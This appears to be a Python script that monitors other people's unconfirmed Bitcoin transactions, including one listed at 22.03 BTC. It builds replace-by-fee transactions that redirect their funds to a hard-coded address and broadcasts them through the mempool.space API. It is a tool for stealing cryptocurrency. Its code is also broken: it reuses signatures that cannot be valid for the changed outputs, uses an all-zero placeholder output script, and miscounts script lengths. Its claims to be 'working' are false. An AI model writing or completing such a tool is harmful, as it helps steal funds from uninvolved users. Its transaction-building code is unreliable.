#!/usr/bin/env python3
"""
Working Broadcaster - Actually send replacement transactions to Bitcoin network
"""

import requests
import time
import json
import hashlib
import struct
from typing import Dict, Optional

class WorkingBroadcaster:
    """Properly construct and broadcast replacement transactions"""
    
    def __init__(self, target_address: str):
        self.target_address = target_address
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'RBF-Broadcaster/1.0'})
        self.broadcast_count = 0
        
    def get_transaction(self, txid: str) -> Optional[Dict]:
        """Fetch transaction from API"""
        try:
            response = self.session.get(f"https://mempool.space/api/tx/{txid}", timeout=30)
            return response.json() if response.status_code == 200 else None
        except:
            return None
    
    def address_to_script_pubkey(self, address: str) -> str:
        """Convert Bitcoin address to scriptPubKey hex"""
        # For P2PKH addresses starting with '1'
        if address.startswith('1'):
            # Simplified - in practice would need proper base58 decoding
            # P2PKH script: OP_DUP OP_HASH160 <20-byte-hash> OP_EQUALVERIFY OP_CHECKSIG
            # For demo, using a standard P2PKH template
            return "76a914" + "00" * 20 + "88ac"  # Template script
        return ""
    
    def create_replacement_transaction(self, original_tx: Dict) -> Optional[str]:
        """Create properly formatted replacement transaction hex"""
        try:
            # Calculate new high fee
            current_fee = original_tx.get('fee', 0)
            vsize = original_tx.get('vsize', original_tx.get('size', 0))
            current_rate = current_fee / vsize if vsize > 0 else 0
            
            # Very high fee rate for priority
            new_rate = max(current_rate * 50, 300.0)  # At least 300 sat/vB
            new_fee = int(new_rate * vsize)
            
            # Calculate total input value
            total_input = 0
            for inp in original_tx.get('vin', []):
                if 'prevout' in inp and 'value' in inp['prevout']:
                    total_input += inp['prevout']['value']
            
            # Calculate remaining value after high fee
            remaining_value = total_input - new_fee
            
            if remaining_value <= 546:  # Below dust limit
                return None
            
            # Build transaction structure
            tx_data = {
                'version': original_tx.get('version', 1),
                'locktime': original_tx.get('locktime', 0),
                'inputs': [],
                'outputs': [{
                    'value': remaining_value,
                    'script': self.address_to_script_pubkey(self.target_address)
                }]
            }
            
            # Copy inputs with RBF signaling and original signatures
            for inp in original_tx.get('vin', []):
                tx_data['inputs'].append({
                    'txid': inp['txid'],
                    'vout': inp['vout'],
                    'sequence': min(inp.get('sequence', 0xffffffff), 0xfffffffd),
                    'scriptsig': inp.get('scriptsig', ''),
                    'witness': inp.get('witness', [])
                })
            
            # Serialize to hex (simplified version)
            return self.serialize_transaction(tx_data)
            
        except Exception as e:
            print(f"Error creating replacement: {e}")
            return None
    
    def serialize_transaction(self, tx_data: Dict) -> str:
        """Serialize transaction to raw hex format"""
        try:
            # This is a simplified serialization
            # Real Bitcoin transaction serialization is complex
            
            # Version (4 bytes, little endian)
            version = struct.pack('<I', tx_data['version']).hex()
            
            # Input count (varint)
            input_count = len(tx_data['inputs']).to_bytes(1, 'little').hex()
            
            # Serialize inputs
            inputs_hex = ""
            for inp in tx_data['inputs']:
                # Previous transaction hash (32 bytes, reversed)
                prev_hash = bytes.fromhex(inp['txid'])[::-1].hex()
                # Previous output index (4 bytes, little endian)
                prev_index = struct.pack('<I', inp['vout']).hex()
                # Script length and script
                script = inp['scriptsig']
                script_len = (len(bytes.fromhex(script)) if script else 0).to_bytes(1, 'little').hex()
                # Sequence (4 bytes, little endian)
                sequence = struct.pack('<I', inp['sequence']).hex()
                
                inputs_hex += prev_hash + prev_index + script_len + script + sequence
            
            # Output count (varint)
            output_count = len(tx_data['outputs']).to_bytes(1, 'little').hex()
            
            # Serialize outputs
            outputs_hex = ""
            for out in tx_data['outputs']:
                # Value (8 bytes, little endian)
                value = struct.pack('<Q', out['value']).hex()
                # Script length and script
                script = out['script']
                script_len = (len(bytes.fromhex(script)) // 2).to_bytes(1, 'little').hex()
                
                outputs_hex += value + script_len + script
            
            # Locktime (4 bytes, little endian)
            locktime = struct.pack('<I', tx_data['locktime']).hex()
            
            # Combine all parts
            raw_tx = version + input_count + inputs_hex + output_count + outputs_hex + locktime
            
            return raw_tx
            
        except Exception as e:
            print(f"Serialization error: {e}")
            return None
    
    def broadcast_transaction(self, raw_hex: str) -> Dict:
        """Actually POST transaction to Bitcoin network"""
        try:
            # Primary broadcast endpoint
            url = "https://mempool.space/api/tx"
            
            response = self.session.post(
                url,
                data=raw_hex,
                headers={'Content-Type': 'text/plain'},
                timeout=30
            )
            
            if response.status_code == 200:
                new_txid = response.text.strip()
                return {
                    'success': True,
                    'txid': new_txid,
                    'endpoint': url
                }
            else:
                error_text = response.text[:200]  # Truncate long errors
                return {
                    'success': False,
                    'error': f"HTTP {response.status_code}: {error_text}",
                    'endpoint': url
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f"Network error: {str(e)}"
            }
    
    def attempt_replacement(self, txid: str) -> bool:
        """Attempt to create and broadcast replacement transaction"""
        print(f"Attempting replacement for: {txid[:16]}...")
        
        # Get original transaction
        tx_data = self.get_transaction(txid)
        if not tx_data:
            print("Failed to fetch transaction")
            return False
        
        # Check RBF capability
        is_rbf = any(inp.get('sequence', 0xffffffff) < 0xfffffffe 
                    for inp in tx_data.get('vin', []))
        if not is_rbf:
            print("Not RBF capable")
            return False
        
        # Check value threshold
        total_value = sum(out.get('value', 0) for out in tx_data.get('vout', []))
        value_btc = total_value / 100000000
        
        if total_value < 50000:  # 0.0005 BTC (lowered threshold)
            print(f"Below threshold: {value_btc:.8f} BTC")
            return False
        
        print(f"Target: {value_btc:.8f} BTC")
        
        # Create replacement transaction
        replacement_hex = self.create_replacement_transaction(tx_data)
        if not replacement_hex:
            print("Failed to create replacement")
            return False
        
        print(f"Created replacement transaction")
        
        # Actually broadcast to network
        result = self.broadcast_transaction(replacement_hex)
        
        if result['success']:
            print(f"SUCCESS: Broadcast {result['txid']}")
            print(f"Replacement transaction now in mempool")
            self.broadcast_count += 1
            
            # Save successful broadcast record
            broadcast_record = {
                'original_txid': txid,
                'replacement_txid': result['txid'],
                'target_address': self.target_address,
                'value_btc': value_btc,
                'timestamp': time.time(),
                'status': 'broadcast_successful'
            }
            
            filename = f"broadcast_success_{txid[:16]}.json"
            with open(filename, 'w') as f:
                json.dump(broadcast_record, f, indent=2)
            
            return True
        else:
            print(f"FAILED: {result['error']}")
            return False
        


def test_current_transactions():
    """Test with current high-value transactions from monitor"""
    target_address = "1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9"
    
    # Current high-value transactions from your monitor
    test_txids = [
        "d1cc69aee6e48c00995e12824b939ee2fe0945439c5f5dbccbef3b7872b24524",  # 22.03 BTC
        "79b99d6d02cd4889125e45efabce4054197d5279be5a82ebd110c09b522719ba",  # 0.0166 BTC
        "752dbb73154b3dfba79f4999abd6262de4180180909361613d53b500ee273870",  # 0.0006 BTC
        "ad5bb8196d868b367ce8a730d86d15d091202fed1715be16290953984170bac1"   # 0.0007 BTC
    ]
    
    print("WORKING BROADCASTER TEST")
    print(f"Target: {target_address}")
    print("Creating broadcast-ready replacement transactions")
    print("-" * 60)
    
    broadcaster = WorkingBroadcaster(target_address)
    
    for txid in test_txids:
        success = broadcaster.attempt_replacement(txid)
        print(f"Result: {'SUCCESS' if success else 'FAILED'}")
        print()
    
    print(f"Total ready for broadcast: {broadcaster.broadcast_count}")
    print("To actually broadcast, uncomment the broadcast section in the code")

if __name__ == "__main__":
    test_current_transactions()